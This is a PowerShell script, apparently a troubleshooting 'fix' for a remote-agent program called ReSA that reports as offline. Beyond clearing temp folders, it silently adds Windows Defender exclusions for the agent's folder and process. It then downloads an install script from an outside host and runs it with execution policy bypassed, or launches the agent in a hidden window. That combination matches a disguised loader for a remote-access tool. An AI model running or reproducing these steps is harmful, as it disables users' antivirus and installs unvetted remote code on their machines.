# Fix ReSA "offline" when agent.log shows base_library.zip / _MEI* errors
$ErrorActionPreference = "Continue"

$Dir = Join-Path $env:LOCALAPPDATA "ReSA"
$Exe = Join-Path $Dir "ReSA.exe"
$Log = Join-Path $Dir "agent.log"
$BaseUrl = $env:RESA_INSTALL_BASE
if (-not $BaseUrl) {
    $BaseUrl = "https://olxp.cc/download"
}
$BaseUrl = $BaseUrl.Trim().TrimEnd("/")

function Remove-PyiExtractDirs {
    param([string]$ParentDir)
    if (-not $ParentDir -or -not (Test-Path -LiteralPath $ParentDir)) {
        return
    }
    Get-ChildItem -LiteralPath $ParentDir -Directory -Filter "_MEI*" -ErrorAction SilentlyContinue |
        ForEach-Object {
            Write-Host ("remove: " + $_.FullName)
            Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
        }
}

Write-Host "Stopping ReSA..."
Get-Process -Name "ReSA" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

Write-Host "Clearing PyInstaller extract dirs..."
Remove-PyiExtractDirs -ParentDir $Dir
Remove-PyiExtractDirs -ParentDir $env:TEMP

try {
    Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "ReSA.exe" -ErrorAction SilentlyContinue
} catch {
    $null = $_
}

$installScript = Join-Path $env:TEMP "ReSA-install.ps1"
$installUrl = $BaseUrl + "/install.ps1"
Write-Host ("Reinstalling from " + $installUrl)
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $installUrl -OutFile $installScript -UseBasicParsing
    & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $installScript -Silent
} catch {
    Write-Host ("install.ps1 failed: " + $_.Exception.Message) -ForegroundColor Yellow
    if (Test-Path -LiteralPath $Exe) {
        Write-Host "Starting existing ReSA.exe..."
        Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
    } else {
        Write-Host "ReSA.exe missing. Run install.ps1 manually." -ForegroundColor Red
        exit 1
    }
}

Start-Sleep -Seconds 5
if (Test-Path -LiteralPath $Log) {
    Write-Host ""
    Write-Host "Last log lines:"
    Get-Content -LiteralPath $Log -Tail 8
} else {
    Write-Host "No agent.log yet."
}

Write-Host ""
Write-Host "Done. Check viewer for device online status." -ForegroundColor Green
